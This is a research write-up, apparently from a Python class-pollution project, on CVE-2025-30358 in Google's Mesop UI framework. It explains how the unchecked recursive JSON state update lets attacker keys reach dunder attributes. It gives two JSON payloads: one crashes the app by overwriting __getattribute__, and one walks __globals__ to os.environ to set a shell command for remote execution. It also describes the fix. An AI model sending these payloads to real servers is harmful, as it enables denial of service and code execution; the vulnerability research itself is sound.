---
title: "Mesop"
weight: 4
---

# Mesop (CVE-2025-30358)

**Mesop** is Google's Python-based UI framework for building web applications (5.7K stars), designed for rapid prototyping of ML demos and internal tools.

| Field | Value |
|-------|-------|
| Repository | [google/mesop](https://github.com/google/mesop) |
| Version | v0.13.0 |
| CVE | CVE-2025-30358 |
| Type | Constrained-Get × Dual-Set |
| Input | Remote (HTTP) |
| Status | Fixed |

## Vulnerability

The vulnerability exists in `_recursive_update_dataclass_from_json_obj`, which deserializes JSON state updates from the client:

```python
def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
    for key, value in json_dict.items():
        if hasattr(instance, key):
            attr = getattr(instance, key)
            if isinstance(value, dict):
                setattr(
                    instance, key,
                    _recursive_update_dataclass_from_json_obj(attr, value),
                )
            else:
                setattr(instance, key, value)
        else:
            if isinstance(instance, dict):
                instance[key] = value
```

The function:
1. Iterates over attacker-controlled JSON keys
2. Checks `hasattr(instance, key)` — this succeeds for dunder attributes like `__class__`
3. Resolves via `getattr(instance, key)` (Constrained-Get)
4. Sets via `setattr` or `instance[key] = value` (Dual-Set)

## Exploitation

### DoS

The simplest attack — overwrite `__getattribute__`:

```json
{
  "__class__": {
    "__getattribute__": "crash"
  }
}
```

**Effect**: All state class instances become inaccessible. The application crashes on any subsequent request that accesses state.

### Remote Execution

Via the standard module traversal pattern:

```json
{
  "__class__": {
    "__init__": {
      "__globals__": {
        "sys": {
          "modules": {
            "os": {
              "environ": {
                "BROWSER": "/bin/sh -c 'id > /tmp/pwned'"
              }
            }
          }
        }
      }
    }
  }
}
```

## Why Mesop Is Interesting

1. **Dataclass-based state**: Mesop uses Python dataclasses for state management, which naturally have dunder attributes accessible via `hasattr`
2. **Client-controlled JSON**: State updates come directly from the browser
3. **Google's framework**: Demonstrates that even major tech companies can introduce class pollution vulnerabilities
4. **Pattern similarity**: The recursive JSON-to-object update pattern is extremely common in Python web frameworks

## Defense Applied (After Fix)

Google's fix for Mesop checks for leading/trailing underscores in key names:

```python
def _recursive_update_dataclass_from_json_obj(instance: Any, json_dict: Any):
    for key, value in json_dict.items():
        if key.startswith("_") or key.endswith("_"):
            continue  # Skip dunder and private attributes
        # ... rest of function
```

This is one of the three defense patterns identified in the paper (see [Defense]({{< relref "/docs/defense" >}})).

## Proof of Concept

See [`cp-collection/mesop/poc/`](https://github.com/jackfromeast/python-class-pollution/tree/main/cp-collection/mesop/poc) for the full exploit.
